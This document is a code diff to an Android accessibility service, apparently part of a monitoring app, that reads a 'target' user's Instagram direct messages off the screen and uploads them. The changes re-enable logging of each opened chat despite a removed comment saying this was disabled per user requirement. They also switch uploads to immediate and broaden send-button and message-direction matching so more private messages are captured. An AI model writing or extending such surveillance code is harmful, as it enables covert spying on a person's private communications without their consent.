@@ -473,6 +473,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                 lastClickedInstagramChat = title
                                 lastClickedInstagramChatTime = System.currentTimeMillis()
                                 currentInstagramChatSeenSignatures.clear()
+                                recordInstagramChatOpened(title)
                             }
                         }
                     } else {
@@ -770,15 +771,17 @@ class BlockAccessibilityService : AccessibilityService() {
                         val cId = (clickedNode.viewIdResourceName ?: "").lowercase()
                         val pDesc = (clickedNode.parent?.contentDescription?.toString() ?: "").trim()
                         val pId = (clickedNode.parent?.viewIdResourceName ?: "").lowercase()
+                        val gpDesc = (clickedNode.parent?.parent?.contentDescription?.toString() ?: "").trim()
+                        val gpId = (clickedNode.parent?.parent?.viewIdResourceName ?: "").lowercase()
 
                         val isSendClick = cDesc.contains("send", ignoreCase = true) ||
                                           cText.equals("send", ignoreCase = true) ||
-                                          cId.contains("composer_button_send") ||
-                                          cId.endsWith(":id/send_button") ||
-                                          (cId.contains("action_button") && cDesc.contains("send", ignoreCase = true)) ||
+                                          cId.contains("send") ||
+                                          cId.contains("action_button") ||
                                           pDesc.contains("send", ignoreCase = true) ||
-                                          pId.contains("composer_button_send") ||
-                                          pId.endsWith(":id/send_button")
+                                          pId.contains("send") ||
+                                          gpDesc.contains("send", ignoreCase = true) ||
+                                          gpId.contains("send")
 
                         if (isSendClick) {
                             var sentText = lastInstagramComposerText
@@ -822,7 +825,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                                         )
                                                     )
                                                 )
-                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                                             }
                                         } catch (_: Exception) {}
                                     }
@@ -880,6 +883,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                     lastClickedInstagramChatTime = System.currentTimeMillis()
                                     lastActiveInstagramChatForSignatures = titleCand
                                     currentInstagramChatSeenSignatures.clear()
+                                    recordInstagramChatOpened(titleCand)
                                     pollHandler.postDelayed({
                                         recordInstagramChatIfForeground(getInstagramWindowRoot())
                                     }, 300L)
@@ -934,7 +938,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                                         )
                                                     )
                                                 )
-                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                                             }
                                         } catch (_: Exception) {}
                                     }
@@ -1764,7 +1768,34 @@ class BlockAccessibilityService : AccessibilityService() {
     }
 
     private fun recordInstagramChatOpened(chatTitle: String) {
-        // Disabled per user requirement: Instagram contacts are ONLY captured when real messages are sent or received.
+        if (chatTitle.isBlank() || isInstagramReservedTitle(chatTitle)) return
+        val now = System.currentTimeMillis()
+        val key = "ig_open|$chatTitle"
+        if (shouldCaptureMessage(key, 3_000L)) {
+            scope.launch {
+                try {
+                    val db = AppDatabase.getInstance(applicationContext)
+                    val existing = db.instagramMessageDao().findExistingRecent(
+                        chatTitle, "Opened chat", false, now - 60_000L
+                    )
+                    if (existing == null) {
+                        db.instagramMessageDao().insertAll(
+                            listOf(
+                                InstagramMessageEntry(
+                                    chatName = chatTitle,
+                                    sender = chatTitle,
+                                    messageText = "Opened chat",
+                                    isOutgoing = false,
+                                    messageTimeEpochMs = now,
+                                    mediaType = "text"
+                                )
+                            )
+                        )
+                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
+                    }
+                } catch (_: Exception) {}
+            }
+        }
     }
 
     private fun recordInstagramDirectListIfVisible(root: AccessibilityNodeInfo?) {
@@ -2400,6 +2431,7 @@ class BlockAccessibilityService : AccessibilityService() {
         if (!chatTitle.equals(lastActiveInstagramChatForSignatures, ignoreCase = true)) {
             lastActiveInstagramChatForSignatures = chatTitle
             currentInstagramChatSeenSignatures.clear()
+            recordInstagramChatOpened(chatTitle)
         }
 
         try {
@@ -2505,18 +2537,17 @@ class BlockAccessibilityService : AccessibilityService() {
                 val lastSentTime = recentSentInstagramTexts[normalizedText]
                 val isRecentlySentByTarget = lastSentTime != null && (now - lastSentTime) < 120_000L
 
-                val isRightAligned = (parentRect.right >= (screenWidth * 0.82f) && parentRect.left > (screenWidth * 0.16f)) ||
-                                     (rect.right >= (screenWidth * 0.78f) && rect.left > (screenWidth * 0.20f))
-                val isLeftAligned = (parentRect.left <= (screenWidth * 0.14f)) || (rect.left <= (screenWidth * 0.18f))
+                val isRightPinned = rect.right >= (screenWidth * 0.72f) && rect.left > (screenWidth * 0.15f)
+                val isLeftPinned = rect.left <= (screenWidth * 0.22f) && rect.right < (screenWidth * 0.75f)
 
                 val isOutgoing = when {
                     isRecentlySentByTarget -> true
                     rawText.startsWith("You sent ", ignoreCase = true) -> true
                     rawText.startsWith("You: ", ignoreCase = true) -> true
                     cd != null && (cd.startsWith("You sent", ignoreCase = true) || cd.startsWith("You:", ignoreCase = true)) -> true
-                    isRightAligned && !isLeftAligned -> true
-                    isLeftAligned -> false
-                    else -> rect.centerX() > (screenWidth * 0.55f) && rect.left > (screenWidth * 0.20f)
+                    isRightPinned -> true
+                    isLeftPinned -> false
+                    else -> rect.centerX() > (screenWidth * 0.50f)
                 }
 
                 val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
@@ -2610,6 +2641,8 @@ class BlockAccessibilityService : AccessibilityService() {
                         Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                     }
                 }
+            } else {
+                recordInstagramChatOpened(chatTitle)
             }
         } catch (_: Exception) {}
     }
